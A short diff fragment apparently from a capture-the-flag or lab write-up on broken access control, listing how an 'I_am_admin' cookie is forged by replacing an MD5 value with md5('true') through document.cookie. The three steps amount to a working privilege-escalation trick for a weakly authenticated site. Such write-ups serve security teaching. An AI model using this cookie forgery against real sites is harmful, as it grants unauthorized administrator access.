@@ -15,4 +15,3 @@ Broken Access Control / Insecure Authentication
 1. Retrieved user cookie: `68934a3e9455fa72420237eb05902327`
 2. Generated admin hash: `md5('true') = b326b5062b2f0e69046810717534cb09`
 3. Set new cookie: `document.cookie = "I_am_admin=b326b5062b2f0e69046810717534cb09"`
-
